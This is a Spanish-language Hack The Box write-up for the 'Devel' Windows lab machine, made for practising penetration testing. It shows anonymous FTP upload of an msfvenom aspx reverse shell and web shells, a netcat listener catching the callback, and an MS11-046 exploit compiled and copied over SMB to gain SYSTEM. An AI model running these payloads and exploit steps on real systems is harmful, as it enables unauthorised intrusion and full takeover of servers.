---
layout: single
title: Devel - Hack The Box
excerpt: "Una máquina bastante sencilla, en la cual usaremos el servicio FTP para cargar un Payload que contendrá una Shell que se activará en el puerto HTTP que corre el servicio IIS y después escalaremos privilegios usando el Exploit MS11-046."
date: 2023-02-14
classes: wide
header:
  teaser: /assets/images/htb-writeup-devel/devel_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Windows
  - FTP Enumeration
  - Local File Inclusion (LFI)
  - Reverse Shell
  - IIS Exploitation
  - Local Privilege Escalation (LPE)
  - LPE - MS11-046
  - OSCP Style
---
![](/assets/images/htb-writeup-devel/devel_logo.png)

Una máquina bastante sencilla, en la cual usaremos el servicio FTP para cargar un Payload que contendrá una Shell que se activará en el puerto HTTP que corre el servicio IIS y después escalaremos privilegios usando el Exploit MS11-046.


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#FTP">Enumeración Servicio FTP</a></li>
				<li><a href="#HTTP">Analizando Puerto 80</a></li>
				<li><a href="#IIS">Investigando Servicio IIS</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Payload">Configurando un Payload y Netcat</a></li>
				<ul>
                                        <li><a href="#Msfvenom">Configurando el Payload con Msfvenom</a></li>
					<li><a href="#Netcat">Configurando Netcat</a></li>
					<li><a href="#Windows">Enumeración de Windows</a></li>
                                </ul>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#Exploit">Buscando, Configurando y Activando un Exploit</a></li>
				<ul>
                                	<li><a href="#PruebaExp">Probando Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)</a></li>
                        	</ul>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está conectada, además vamos a analizar el TTL para saber que SO usa dicha máquina.
```
ping -c 4 10.10.10.5
PING 10.10.10.5 (10.10.10.5) 56(84) bytes of data.
64 bytes from 10.10.10.5: icmp_seq=1 ttl=127 time=132 ms
64 bytes from 10.10.10.5: icmp_seq=2 ttl=127 time=132 ms
64 bytes from 10.10.10.5: icmp_seq=3 ttl=127 time=131 ms
64 bytes from 10.10.10.5: icmp_seq=4 ttl=127 time=131 ms

--- 10.10.10.5 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3015ms
rtt min/avg/max/mdev = 130.729/131.531/132.293/0.750 ms
```
Ok, vemos que la máquina usa Windows. Es momento de hacer los escaneos de puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.5 -oG allPorts             
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 13:01 CST
Initiating SYN Stealth Scan at 13:01
Scanning 10.10.10.5 [65535 ports]
Discovered open port 21/tcp on 10.10.10.5
Discovered open port 80/tcp on 10.10.10.5
Increasing send delay for 10.10.10.5 from 0 to 5 due to 11 out of 19 dropped probes since last increase.
Completed SYN Stealth Scan at 13:02, 30.37s elapsed (65535 total ports)
Nmap scan report for 10.10.10.5
Host is up, received user-set (0.73s latency).
Scanned at 2023-02-14 13:01:55 CST for 30s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 30.54 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 30 (1.304KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Al parecer solamente hay 2 puertos abiertos y que ya conocemos, el puerto 21 que es el servicio FTP y el puerto 80 que es HTTP, ósea una página web. Hagamos el escaneo de servicios.

<h2 id="Servicios">Escaneo de Servicios</h2>

```
nmap -sC -sV -p21,80 10.10.10.5 -oN targeted                                                   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 13:02 CST
Nmap scan report for 10.10.10.5
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.80 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Vemos que en el servicio FTP tenemos activado el login como **anonymous**, vamos a meternos para ver que podemos encontrar y después analizaremos la página web.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="FTP">Enumeración Servicio FTP</h2>

```
ftp 10.10.10.5  
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:berserkwings): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```
Pues no hay mucho que podamos usar, el PNG debe pertenecer a la página web así que vamos a ver que hay en el directorio **aspnet_client**:
```
ftp> cd aspnet_client
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          system_web
226 Transfer complete.
ftp> cd system_web
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49160|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          2_0_50727
226 Transfer complete.
ftp> cd 2_0_50727
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49162|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> cd ..
250 CWD command successful.
ftp> cd ../..
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49163|)
150 Opening ASCII mode data connection.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> exit
221 Goodbye.
```
No pues no, no hay nada de interés. Antes de irnos a analizar la página web, intentemos ver si podemos subir archivos.

Creamos un archivo random:
```
whoami > test.txt
```
Y lo intentamos subir al FTP:
```
ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:berserkwings): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||49164|)
125 Data connection already open; Transfer starting.
100% |************************************************************************************************|     6       53.75 KiB/s    --:-- ETA
226 Transfer complete.
6 bytes sent in 00:00 (0.04 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49165|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-28-23  10:12PM                    6 test.txt
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```
Mmmmmm vaya, vaya, así que podemos subir archivos. Antes de investigar cómo podemos vulnerar el servicio FTP, analicemos la página web para ver que encontramos.

<h2 id="HTTP">Analizando Puerto 80</h2>

Al entrar en la página, no hay nada, más que una imagen del servicio que está corriendo y si le damos click a la imagen nos mandara directo a la página de Microsoft acerca del servicio IIS.

![](/assets/images/htb-writeup-devel/Captura1.png)

Que nos dice el **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-devel/Captura2.png">
</p>

No hay mucho que destacar y un **Fuzzing** no creo que sea útil.

¡MOMENTO! ¿Recuerdas que subimos un archivo al servicio FTP? Bueno, ese archivo tiene el comando **whoami**, no se podía ejecutar en el FTP, pero quizá aquí sí.

Intentemos ver si se puede ejecutar:

<p align="center">
<img src="/assets/images/htb-writeup-devel/Captura3.png">
</p>

¡¡SI FUNCIONA!! Así que podemos subir una netcat o un Payload de **msfvenom** para que nos conecte directamente, podríamos hacer los dos, pero ¿qué archivos son los que lee este servicio? Porque no servirá ni el Payload ni la netcat si los subimos como archivos de texto, o al menos es lo que yo creo.

Hay que investigar un poco sobre el servicio IIS.

<h2 id="IIS">Investigando Servicio IIS</h2>

De acuerdo con el siguiente link de la página HackTricks: 
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services

El servicio IIS puede ejecutar las siguientes extensiones:
* asp
* aspx
* config
* php

De momento vamos a descartar la PHP y el config porque no creo que nos sirvan para cargar el Payload ni la netcat, así que vamos a investigar la extensión asp y aspx:

**Active Server Pages, ​ también conocido como ASP clásico, es una tecnología de Microsoft del lado del servidor para páginas web generadas dinámicamente, que ha sido comercializada como un anexo a Internet Information Services (IIS).**

Ósea que es una página en sí.

**La extensión de archivo ASPX se utiliza para páginas web que son generadas automáticamente por el servidor y dirigen directamente a un servidor activo.**

Ósea que es un archivo ejecutable, ya tenemos con que trabajar.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>

<h2 id="Payload">Configurando un Payload y Netcat</h2>

Vamos a configurar primero el Payload y luego la Netcat.

<h3 id="Msfvenom">Configurando el Payload con Msfvenom</h3>

Vamos a empezar configurando un Payload con **msfvenom** para que nos conecte como lo hemos hecho con máquinas anteriores:
```
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.12 LPORT=443 -o IIS_Shell.aspx  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2737 bytes
Saved as: IIS_Shell.aspx
```
Ahora entramos al servicio FTP, subimos el archivo **.aspx** y comprobamos que este dentro:
```
ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:berserkwings): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put IIS_Shell.aspx 
local: IIS_Shell.aspx remote: IIS_Shell.aspx
229 Entering Extended Passive Mode (|||49166|)
150 Opening ASCII mode data connection.
100% |************************************************************************************************|  2775       39.49 MiB/s    --:-- ETA
226 Transfer complete.
2775 bytes sent in 00:00 (20.57 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49167|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-28-23  11:08PM                 2775 IIS_Shell.aspx
03-28-23  10:12PM                    6 test.txt
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> exit
221 Goodbye.
```
Muy bien, ya está dentro, ahora activemos una netcat:
```
nc -nvlp 443                                    
listening on [any] 443 ...
```
Y, por último, veamos si se activa desde la página web:

<p align="center">
<img src="/assets/images/htb-writeup-devel/Captura4.png">
</p>

¡¡EUREKA!! Estamos dentro:
```
nc -nvlp 443                                    
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.5] 49168
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```
Muy bien, ahora probemos con la netcat.

<h3 id="Netcat">Configurando Netcat</h3>

Resulta que, si requieres un archivo **.aspx** que contenga un Payload y devuelva una Shell, existen dentro del **Kali Linux** y supongo que dentro de **Parrot** como la netcat o nc.exe que usamos en la **máquina Legacy**.

Para buscarlo solo usamos el comando locate de la siguiente manera:
```
locate .aspx
/usr/share/davtest/backdoors/aspx_cmd.aspx
/usr/share/laudanum/aspx/shell.aspx
/usr/share/metasploit-framework/data/templates/scripts/to_exe.aspx.template
/usr/share/metasploit-framework/data/templates/scripts/to_mem.aspx.template
/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
/usr/share/seclists/Web-Shells/laudanum-0.8/aspx/dns.aspx
/usr/share/seclists/Web-Shells/laudanum-0.8/aspx/file.aspx
/usr/share/seclists/Web-Shells/laudanum-0.8/aspx/shell.aspx
/usr/share/sqlmap/data/shell/backdoors/backdoor.aspx_
/usr/share/sqlmap/data/shell/stagers/stager.aspx_
/usr/share/webshells/aspx/cmdasp.aspx
```
Como puedes ver, hay varias opciones, pero hay 2 en particular que nos pueden servir:
* aspx_cmd.aspx
* shell.aspx

Analicemos un poco lo que nos dicen ambos.

Después de ver lo que hay dentro de los dos, prefiero usar el **aspx_cmd.aspx** porque el **shell.aspx** no entiendo si hay que configurarle una IP pues lo que hace, o al menos eso creo, es comenzar a analizar IPs en cierto rango ya establecido para poder conectarse a alguna, caso contrario con el **aspx_cmd.aspx** que al parecer saca una consola interactiva en la página web. Además, intente buscar información del archivo **shell.aspx** en la página que puso el autor pero ya no está activa, tons queda descartado.

Así que vamos a probar el **aspx_cmd.aspx**.

Vamos a copiarlo en el directorio que estamos ocupando para esta máquina:
```
cp /usr/share/laudanum/aspx/shell.aspx .
ls          
aspx_cmd.aspx  IIS_Shell.aspx  shell.aspx  test.txt
```
Ahora lo subimos al FTP:
```
ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:berserkwings): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put aspx_cmd.aspx 
local: aspx_cmd.aspx remote: aspx_cmd.aspx
229 Entering Extended Passive Mode (|||49169|)
150 Opening ASCII mode data connection.
100% |************************************************************************************************|  1438       29.17 MiB/s    --:-- ETA
226 Transfer complete.
1438 bytes sent in 00:00 (10.55 KiB/s)
ftp> exit
221 Goodbye.
```
No pues sí, ya estamos dentro, pero pues en la página web. 

![](/assets/images/htb-writeup-devel/Captura5.png)

<p align="center">
<img src="/assets/images/htb-writeup-devel/Captura6.png">
</p>

Quizá podríamos tratar de ejecutar una netcat que este dentro del servicio FTP para conectarnos hacia nuestra máquina como con el Payload, pero ya me dio hueva la verdad y pueden probarlo también, sería lo mismo que hicimos en la **máquina Legacy**. 

Vamos a cambiar al Payload y a conseguir acceso como Root.

<h2 id="Windows">Enumeración de Windows</h2>

Una vez más dentro de la máquina, vamos a buscar la flag del usuario:
```
c:\windows\system32\inetsrv>cd C:\
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\

11/06/2009  12:42 ��                24 autoexec.bat
11/06/2009  12:42 ��                10 config.sys
17/03/2017  07:33 ��    <DIR>          inetpub
14/07/2009  05:37 ��    <DIR>          PerfLogs
13/12/2020  01:59 ��    <DIR>          Program Files
18/03/2017  02:16 ��    <DIR>          Users
11/02/2022  05:03 ��    <DIR>          Windows
               2 File(s)             34 bytes
               5 Dir(s)   4.677.365.760 bytes free
```
Recuerda siempre ir a la carpeta usuarios y puede estar en la de Public o en el nombre de algún usuario:
```
C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\Users

18/03/2017  02:16 ��    <DIR>          .
18/03/2017  02:16 ��    <DIR>          ..
18/03/2017  02:16 ��    <DIR>          Administrator
17/03/2017  05:17 ��    <DIR>          babis
18/03/2017  02:06 ��    <DIR>          Classic .NET AppPool
14/07/2009  10:20 ��    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)   4.677.365.760 bytes free

C:\Users>cd babis
cd babis
Access is denied.
```
A kbron, no se puede, bueno vamos a ver en la de Public:
```
C:\Users>cd Public
cd Public

C:\Users\Public>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\Users\Public

14/07/2009  10:20 ��    <DIR>          .
14/07/2009  10:20 ��    <DIR>          ..
14/07/2009  07:53 ��    <DIR>          Documents
14/07/2009  07:41 ��    <DIR>          Downloads
14/07/2009  07:41 ��    <DIR>          Music
14/07/2009  07:41 ��    <DIR>          Pictures
14/07/2009  10:20 ��    <DIR>          Recorded TV
14/07/2009  07:41 ��    <DIR>          Videos
               0 File(s)              0 bytes
               8 Dir(s)   4.677.365.760 bytes free
```
No pues no, no hay nada, entonces hay que entrar como Root para que podamos ver las flags. Vamos a buscar que podemos usar para acceder a la máquina como Root.

```
C:\Users>cd ..
cd ..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\

11/06/2009  12:42 ��                24 autoexec.bat
11/06/2009  12:42 ��                10 config.sys
17/03/2017  07:33 ��    <DIR>          inetpub
14/07/2009  05:37 ��    <DIR>          PerfLogs
13/12/2020  01:59 ��    <DIR>          Program Files
18/03/2017  02:16 ��    <DIR>          Users
11/02/2022  05:03 ��    <DIR>          Windows
               2 File(s)             34 bytes
               5 Dir(s)   4.677.365.760 bytes free

C:\>cd Program Files
cd Program Files

C:\Program Files>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\Program Files

13/12/2020  01:59 ��    <DIR>          .
13/12/2020  01:59 ��    <DIR>          ..
28/12/2017  02:49 ��    <DIR>          Common Files
14/07/2009  10:20 ��    <DIR>          DVD Maker
14/07/2009  07:56 ��    <DIR>          Internet Explorer
14/07/2009  07:52 ��    <DIR>          MSBuild
14/07/2009  07:52 ��    <DIR>          Reference Assemblies
13/12/2020  01:59 ��    <DIR>          VMware
14/07/2009  07:56 ��    <DIR>          Windows Defender
14/07/2009  10:20 ��    <DIR>          Windows Journal
14/07/2009  07:56 ��    <DIR>          Windows Mail
14/07/2009  07:56 ��    <DIR>          Windows Media Player
14/07/2009  07:52 ��    <DIR>          Windows NT
14/07/2009  07:56 ��    <DIR>          Windows Photo Viewer
14/07/2009  07:52 ��    <DIR>          Windows Portable Devices
14/07/2009  07:56 ��    <DIR>          Windows Sidebar
               0 File(s)              0 bytes
              16 Dir(s)   4.677.365.760 bytes free
```
No veo nada que conozca que sea vulnerable, quizá el **MSBuild**, pero no sé qué sea, investiguémoslo:

**Microsoft Build Engine, o MSBuild, es un conjunto de herramientas de compilación gratuitas y de código abierto para código administrado bajo Common Language Infrastructure, así como código nativo C y C++. Fue lanzado por primera vez en 2003 y era parte de .NET Framework.**

No pues no creo que sea útil, entonces vámonos a lo seguro. Veamos que privilegios tenemos y que versión de sistema operativo tiene la máquina:
```
C:\>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

C:\>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
```
Ok tenemos el privilegio **SeImpersonatePrivilege** y vemos que el SO es **WIndows 7 6.1.7600**, además de que el dueño es **babis**. Vamos a buscar un Exploit.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Post" style="text-align:center;">Post Explotación</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Exploit">Buscando, Configurando y Activando un Exploit</h2>

Buscando por internet, nos aparece uno en particular que es el **MS11-046** que es un **Local Privilege Escalation** y que justamente nos serviría en estos momentos. 
Puede verlo en el siguiente link: 

* https://www.exploit-db.com/exploits/40564

Vamos a buscarlo con la herramienta **Searchsploit**:
```
searchsploit MS11-046                  
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)                                  | windows_x86/local/40564.c
Microsoft Windows - 'afd.sys' Local Kernel (PoC) (MS11-046)                                                | windows/dos/18755.c
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Paper Title                                                                                               |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
MS11-046 - Dissecting a 0day                                                                               | docs/english/18712-ms11-046---di
----------------------------------------------------------------------------------------------------------- ---------------------------------
```
Justamente lo tenemos, vamos a copiarlo y a analizarlo para saber cómo usarlo.

<h3 id="PruebaExp">Probando Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)</h3>

Gracias al creador del Exploit, nos deja una pequeña explicación para convertir el Exploit en un ejecutable **.exe**:
```
Exploit notes:
   Privileged shell execution:
     - the SYSTEM shell will spawn within the invoking shell/process
   Exploit compiling (Kali GNU/Linux Rolling 64-bit):
     - # i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
   Exploit prerequisites:
     - low privilege access to the target OS
     - target OS not patched (KB2503665, or any other related
       patch, if applicable, not installed - check "Related security
       vulnerabilities/patches")
   Exploit test notes:
     - let the target OS boot properly (if applicable)
     - Windows 7 (SP0 and SP1) will BSOD on shutdown/reset
```
OJO: aquí la importancia de leer los Exploits para saber cómo funcionan o si es necesario configurarlos.

Entonces vamos a usar la herramienta **i686-w64-mingw32-gcc**, si estas usando **Kali Linux** ya la deberías tener instalada y si usas **Parrot** pues la verdad no sabría decirte, sin embargo, aquí está el link del cómo pueden instalar dicha herramienta: https://github.com/RUB-SysSec/WindowsVTV

Vamos a convertir ese Exploit a un ejecutable **.exe**, recuerda que el Exploit se descargó con el nombre **40564.c**:
```
i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
ls
40564.c  aspx_cmd.aspx  IIS_Shell.aspx  MS11-046.exe  nc.exe  shell.aspx  test.txt
```
Ahora que lo tenemos, ya podemos subirlo a la máquina.

Al igual que en la **máquina Legacy**, vamos a abrir un servidor con **Impacket** para poder subirlo, vámonos por pasos:

* Abriendo servidor:
```
smbserver.py smbFolder $(pwd)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
* Para subir el Exploit debemos ir a la carpeta Temp:

```
C:\Windows>cd /Windows/Temp
cd /Windows/Temp
C:\Windows\Temp>
```
* Crearemos una carpeta para guardarlo ahí:

```
C:\Windows\Temp>mkdir AquiNoHayNingunExploit
mkdir AquiNoHayNingunExploit
C:\Windows\Temp>cd AquiNoHayNingunExploit
cd AquiNoHayNingunExploit
```
* Copiamos el Exploit:

```
C:\Windows\Temp\AquiNoHayNingunExploit>copy \\10.10.14.12\smbFolder\MS11-046.exe MS11-046.exe                                            
copy \\10.10.14.12\smbFolder\MS11-046.exe MS11-046.exe
        1 file(s) copied
```
* Lo activamos:

```
C:\Windows\Temp\AquiNoHayNingunExploit>.\MS11-046.exe
.\MS11-046.exe
c:\Windows\System32>whoami
whoami
nt authority\system
```
* Y buscamos las flags:

```
c:\Windows\System32>cd C:\
cd C:\
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971
 Directory of C:\
11/06/2009  12:42 ��                24 autoexec.bat
11/06/2009  12:42 ��                10 config.sys
17/03/2017  07:33 ��    <DIR>          inetpub
14/07/2009  05:37 ��    <DIR>          PerfLogs
13/12/2020  01:59 ��    <DIR>          Program Files
18/03/2017  02:16 ��    <DIR>          Users
11/02/2022  05:03 ��    <DIR>          Windows
               2 File(s)             34 bytes
               5 Dir(s)   4.677.234.688 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\Users

18/03/2017  02:16 ��    <DIR>          .
18/03/2017  02:16 ��    <DIR>          ..
18/03/2017  02:16 ��    <DIR>          Administrator
17/03/2017  05:17 ��    <DIR>          babis
18/03/2017  02:06 ��    <DIR>          Classic .NET AppPool
14/07/2009  10:20 ��    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)   4.677.234.688 bytes free

C:\Users>cd Administrator/Desktop
cd Administrator/Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\Users\Administrator\Desktop

14/01/2021  12:42 ��    <DIR>          .
14/01/2021  12:42 ��    <DIR>          ..
28/03/2023  09:59 ��                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   4.677.234.688 bytes free

C:\Users\Administrator\Desktop>cd ../..
cd ../..

C:\Users>cd babis/Desktop
cd babis/Desktop

C:\Users\babis\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of C:\Users\babis\Desktop

11/02/2022  04:54 ��    <DIR>          .
11/02/2022  04:54 ��    <DIR>          ..
28/03/2023  09:59 ��                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   4.677.234.688 bytes free
```
Y listo, ya tenemos las flags de la máquina.


<br>
<br>
<div style="position: relative;">
 <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>

* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#internal-ip-address-disclosure
* https://medium.com/@kubotortech/pentesting-exploiting-ftp-cba8ec81968e
* https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
* https://www.infosecmatter.com/nessus-plugin-library/?id=108808
* https://victorroblesweb.es/2013/12/02/comandos-ftp-en-la-consola/
* https://www.exploit-db.com/exploits/40564
* https://www.rapid7.com/db/vulnerabilities/WINDOWS-HOTFIX-MS11-046/


<br>
# FIN
